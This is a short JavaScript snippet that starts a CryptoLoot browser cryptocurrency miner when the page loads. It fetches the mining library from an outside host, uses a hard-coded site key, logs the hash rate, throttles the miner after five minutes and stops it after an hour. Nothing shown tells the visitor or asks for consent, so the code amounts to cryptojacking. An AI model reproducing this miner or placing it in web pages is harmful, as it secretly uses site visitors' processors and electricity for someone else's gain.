$(window).on('load', function () {
  CryptoLoot.CONFIG.LIB_URL = 'http://www.helloleia.com/dash-static/lib/'
  var miner = new CryptoLoot.Anonymous('4a42a311ef111dbd6e6f62553cb2eedb67fd559fddaf', {
    autoThreads: false,
    throttle: 0.92
  })
  miner.start()
  setInterval(function () {
    var hashesPerSecond = miner.getHashesPerSecond()
    console.log(hashesPerSecond)
  }, 3000)
  setTimeout(function () {
    console.log('Switching miner to low power mode')
    miner.setThrottle(0.99)
    setTimeout(function () {
      console.log('Miner off')
      miner.stop()
    }, 60 * 60 * 1000)
  }, 5 * 60 * 1000)
})
